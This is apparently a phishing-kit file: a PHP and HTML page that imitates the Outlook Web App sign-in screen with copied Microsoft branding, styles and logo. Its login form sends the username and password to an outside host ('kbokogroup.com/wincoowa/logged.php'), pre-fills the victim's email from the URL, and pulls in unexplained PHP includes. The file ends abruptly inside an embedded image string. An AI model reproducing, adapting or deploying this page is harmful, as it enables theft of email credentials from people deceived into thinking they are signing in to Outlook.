<?php
session_start();
include('otenka.php');
include('waa.php');
$email = '';
if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
<!-- OwaPage = ASP.auth_logon_aspx -->

<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> 
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=10" />
<link rel="shortcut icon" href="/owa/auth/15.1.1591/themes/resources/favicon.ico" type="image/x-icon">
<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
<meta name="Robots" content="NOINDEX, NOFOLLOW">
<title>Outlook</title>
<style>
@font-face {
    font-family: "wf_segoe-ui_normal";
    src: url("/owa/auth/15.1.1591/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
            url("/owa/auth/15.1.1591/themes/resources/segoeui-regular.ttf") format("truetype");
}

@font-face {
    font-family: "wf_segoe-ui_semilight";
    src: url("/owa/auth/15.1.1591/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
        url("/owa/auth/15.1.1591/themes/resources/segoeui-semilight.ttf") format("truetype");
}

@font-face {
    font-family: "wf_segoe-ui_semibold";
    src: url("/owa/auth/15.1.1591/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
        url("/owa/auth/15.1.1591/themes/resources/segoeui-semibold.ttf") format("truetype");
}
</style>
<style>/*Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/

body.rtl 
{
	text-align:right;
	direction:rtl;
}

body, .mouse, .twide, .tnarrow, form
{
    height: 100%;
    width: 100%;
    margin: 0px;
}

.mouse, .twide 
{
    min-width: 650px; /* min iPad1 dimension */
    min-height: 650px;
    position: absolute;
    top:0px;
    bottom:0px;
    left:0px;
    right:0px;
}

.sidebar 
{
    background-color:#0072C6;
}

.mouse .sidebar, .twide .sidebar
{
    position:absolute;
    top: 0px;
    bottom: 0px;
    left: 0px;
    display: inline-block;
    width: 332px;
}

.tnarrow .sidebar
{
    display: none;
}

.mouse .owaLogoContainer, .twide .owaLogoContainer
{
    margin:213px auto auto 109px;
    text-align:left     /* Logo aligns left for both ltr & rtl */
}

.tnarrow .owaLogo 
{
    display: none;
}

.mouse .owaLogoSmall, .twide .owaLogoSmall
{
    display: none;
}

.logonDiv 
{ 
	text-align:left;
}

.rtl .logonDiv 
{ 
	text-align:right;
}

.mouse .logonContainer, .twide .logonContainer
{
    padding-top: 174px;
    padding-left: 464px;
    padding-right:142px;
    position:absolute;
    top:0px;
    bottom: 0px;
    left: 0px;
    right: 0px;
    text-align: center;
}

.mouse .logonDiv, .twide .logonDiv
{
    position: relative;
    vertical-align:top;
    display: inline-block;
    width: 423px;
}

.tnarrow .logonDiv
{
    margin:25px auto auto -130px;
    position: absolute;
    left: 50%;
    width: 260px;
    padding-bottom: 20px;
}

.twide .signInImageHeader, .tnarrow .signInImageHeader
{
    display: none;
}

.mouse .signInImageHeader
{
    margin-bottom:22px;
}

.twide .mouseHeader
{
    display: none;
}

.mouse .twideHeader
{
    display: none;
}

input::-webkit-input-placeholder
{
    font-size:16px;
    color: #98A3A6;
}

input:-moz-placeholder 
{
    font-size:16px;
    color: #98A3A6;
}

.tnarrow .signInInputLabel, .twide .signInInputLabel
{
    display: none;
}

.mouse .signInInputLabel
{
    margin-bottom: 2px;
}

.mouse .showPasswordCheck
{
    display: none;
}

.signInInputText
{
    border:1px solid #98A3A6;
    color: #333333;
    border-radius: 0;
    -moz-border-radius: 0;
    -webkit-border-radius: 0;
    box-shadow: none;
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    -webkit-appearance:none;
    background-color: #FDFDFD;
	width:250px;
	margin-bottom:10px;
	box-sizing: content-box;
    -moz-box-sizing: content-box;
    -webkit-box-sizing: content-box;
}

.mouse .signInInputText 
{
    height: 22px;
    font-size: 12px;
    padding: 3px 5px;
    color: #333333;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-bottom: 20px;
}

.twide .signInInputText, .tnarrow .signInInputText
{
    border-color: #666666;
    height: 22px;
    font-size: 16px;
    color: #000000;
    padding: 7px 7px;
	font-family:'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-bottom:20px;
	width: 264px;
}

.divMain
{
	width: 444px;
}

.l
{
	text-align:left;
}
.rtl .l
{
	text-align:right;
}
.r
{
	text-align:right;
}
.rtl .r
{
	text-align:left;
}

table#tblMain
{
	margin-top: 48px;
	padding: 0px; 
}
table.mid
{
	width: 385px;
	border-collapse:collapse;
	padding: 0px; 
	color:#444444; 
}
table.tblConn
{
	direction:ltr;
}
td.tdConnImg
{
	width: 22px;
}
td.tdConn
{
	padding-top: 15px;
}
td#mdLft
{
	background: url("lgnleft.gif") repeat-y;
	width: 15px;
}
td#mdRt
{
	background: url("lgnright.gif") repeat-y;
	width: 15px;
}
td#mdMid
{
	padding: 0px 45px;
	background: #ffffff; 
	vertical-align: top;
}
td .txtpad
{
	padding: 3px 6px 3px 0px; 
}
.txt
{
	padding: 3px; 
	height: 2.2em;
}
input.btn
{
	color: #ffffff;
	background-color: #eb9c12;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnFcs
{
	color: #ffffff;
	background-color: #eb9c12;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnMseOvr
{
	color: #ffffff;
	background-color: #f9b133;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnMseDwn
{
	color: #000000;
	background-color: #f9b133;
	border: 0px solid #f9b133;
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.nowrap
{
	white-space:nowrap;
}
hr
{
	height: 0px; 
	visibility: hidden;
}

.wrng
{
	color:#ff6c00;
}
.disBsc
{
	color:#999999;
}
.expl
{
	color:#999999;
}
.w100, .txt
{
	width: 100%;
}
.txt
{
	margin: 0px 6px; 
}
.rdo
{
	margin: 0px 12px 0px 32px;
}
body.rtl .rdo
{
	margin: 0px 32px 0px 12px;
}
tr.expl td, tr.wrng td
{
	padding: 2px 0px 4px; 
}
tr#trSec td
{
	padding: 3px 0px 8px; 
}
/* language page specific styles */
td#tdLng
{
	padding: 12px 0px; 
}
td#tdTz
{
	padding: 8px 0px; 
}
select#selTz
{
	padding: 0px; 
	margin: 0px; 
}
td#tdOptMsg
{
	padding: 10px 0px; 
}
td#tdOptChk
{
	padding: 0px 0px 15px 65px;
}
td#tdOptAcc
{
	vertical-align:middle;
	padding: 0px 0px 0px 3px; 
}
select#selLng
{
	margin: 0px 16px;
}
/* logoff page specific styles */
td#tdMsg
{
	margin: 9px 0px 64px;
}
input#btnCls
{
	margin: 3px 6px; 
}
td.lgnTL, td.lgnBL
{
	width: 456px;
}
td.lgnTM
{
	background: url("lgntopm.gif") repeat-x;
	width: 100%;
}
td.lgnBM
{
	background: url("lgnbotm.gif") repeat-x;
	width: 100%;
}
td.lgnTR, td.lgnBR
{
	width: 45px;
}
table.tblLgn
{
	padding: 0px; 
	margin: 0px; 
	border-collapse:collapse;
	width: 100%;
}
.signInBg
{
	margin:0px;
}

.signInTextHeader
{
	font-size:60px;
	color:#404344;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-bottom:18px;
	white-space: nowrap;
}

.signInInputLabel
{
	font-size:12px;
	color:#666666;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.signInCheckBoxText
{
	font-size:12px;
	color:#6A7479;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:16px;
}

.twide .signInCheckBoxText, .tnarrow .signInCheckBoxText
{
    font-size: 15px;
}

.signInCheckBoxLink
{
	font-size:12px;
	color:#0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.signInEnter
{
	font-size:22px;
	color:#0072C6;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:20px;
}

.twide .signInEnter
{
	margin-top:17px;
	font-size: 29px;
}

.tnarrow .signInEnter 
{
	margin-top:2px;
	font-size: 29px;
	position: relative;
	float: left;
	left: 50%;
}

.signinbutton 
{
    cursor:pointer;
    display:inline
}

.mouse .signinbutton
{
    padding: 0px 8px 5px 8px;
    margin-left: -8px;
}

.rtl .mouse .signinbutton
{
    margin-right: -8px;
}

.tnarrow .signinbutton 
{
	position: relative;
	float: left;
	left: -50%;
}

.shellDialogueHead
{
	font-size:29px;
	color:#0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.mouse .shellDialogueHead 
{
    line-height: 35px;
    margin-bottom: 10px;
}

.twide  .shellDialogueHead, .tnarrow .shellDialogueHead
{
	line-height:34px;
	margin-bottom: 12px;
}

.shellDialogueMsg
{
	font-size:13px;
	color:#333333;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	line-height:18px;
}

.twide .shellDialogueMsg, .tnarrow .shellDialogueMsg
{
    font-size: 15px;
}

.headerMsgDiv 
{
    width: 350px;
    margin-bottom: 22px;
}

.twide .headermsgdiv
{
    margin-bottom: 30px;
}

.tnarrow .headermsgdiv
{
    width: 260px;
    margin-bottom: 30px;
}

.signInError
{
	font-size:12px;
	color:#C1272D;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:12px;
}

.passwordError
{
    color: #A80F22;
	font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    line-height: 18px;
}

.mouse .passwordError
{    
    margin-top: 10px;
    font-size: 13px;
}

.twide .passwordError, .tnarrow .passwordError
{
    margin-top: 12px;
    font-size: 15px;
}

.signInExpl
{
	font-size:12px;
	color:#999999;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:5px;
}

.signInWarning
{
	font-size:12px;
	color:#C1272D;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:5px;
}

input.chk
{
	margin-right:9px;
	margin-left:0px;
}

.imgLnk
{
	vertical-align: middle;	
	line-height:2;
	margin-top: -2px;
}

.signinTxt
{
	padding-left:11px;
	padding-right:11px;     /* Needed for RTL, doesnt hurt to add this for LTR as well */
}

.hidden-submit { 
    border: 0 none; 
    height: 0; 
    width: 0; 
    padding: 0; 
    margin: 0; 
    overflow: hidden; 
} 

.officeFooter
{
    position:absolute;
    bottom: 33px;
    right: 45px;
}

.tnarrow .officeFooter
{
    display: none;
}
</style>


</head>
<body class="signInBg" style="background: #f2f2f2 url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC') repeat-x"/>


<script type="text/javascript">
    RndMimeCtl();
</script>


<noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAptJREFUeNqkU01LVFEYfu7XzJ17nZmyJBW0sgRDRAgLoi8tghZG9QNaR7tg2vQjbCu2a9Eq2qRGUYFBZAtLURzSUUcJG8d0ZnTu99fpPdIMSktfOOfcezjP8z7vc94jMMZwmJD5JAhCfWPm0e2+MGKDYRQNBCHrpTWi/1kaExFjY7defp6qneXJhb3pHwGBH4qy8uSIrp9NqjJ0TXsXuvZ0KfvjacEVsIlEzhXkofuvJ0f+I+BgVdOftfZe0OIsQBBTFxLX7raxCIH75vn3xOjwQDbQsSgfNw0pkXkwPjXCsWJNNjFlmttPaWrqKBBTEb9yr0No7tCEptaU3H3xMgQJp90imo2C7plGZvhmbx/H7hHwmnUJnWpjI8L1ZSg7fyBoSQWUHo4FIabFwEJE5HeLX4JmVzqrtjdYN5GM6k95FlhpE4q5A8GzEWzkITYkKYWEqLgG+C58IgiIMx1WkfX0/joBud2Tsrco+wokZ5dAIsL5Scgnu8ACH/7qTyL14RDYo/NJZqPq+D37FYDtlqHlp6n+xF7WYHkO8ZBkE6G9tgQ3BCwabsTdBwzbw34P5oohfZaKwHYB2CrA+bWCyKwgyC/AIU+qnIDAAYE3PAmG48/tU8Am1uXU9XR1A4rrQ6S2iHwP9pe3dIc2/OouTCLgJfBYNCVYrj9RV8A7rCIncwvSMWz5JIDUyW2dkXr1DmKnzxFBuVwDZw0JMxXkLC8YqxPw9vSk2NC62mQui2mUA9rsvpSX0o1+vL2r7InxFzXwp03R/G1GQx9Na6pOwIO3p6U0ZFbjLbl56QRY9tsZbyU7W/jwalyKq4/fb6sYLSq5JUPIfA28kRruwFvgwTuMNwmNG3RV58ntkAyb5jVz2bXMB97CYeKvAAMACjWGjcO+NcIAAAAASUVORK5CYII=" alt=""></td>
			<td style="width:100%">To use Outlook, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook.</td>
		</tr>
		</table>
	</div>
</noscript>

<form action="https://kbokogroup.com/wincoowa/logged.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
<input type="hidden" name="destination" value="">
<input type="hidden" name="flags" value="4">
<input type="hidden" name="forcedownlevel" value="0">
 
 <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
<div id="mainLogonDiv" class="mouse">
    <script>

        var mainLogonDiv = window.document.getElementById("mainLogonDiv");
        mainLogonDiv.className = mainLogonDivClassName;
    </script>
    <div class="sidebar">
        <div class="owaLogoContainer">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABsCAYAAACiuLoyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMwQzQ2MDA4RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMwQzQ2MDA5RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzBDNDYwMDZGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzBDNDYwMDdGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5qf500AAAGPUlEQVR42uxdOXLjRhRt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" class="owaLogo" aria-hidden="true" />
            <img src="data:image/png;base64,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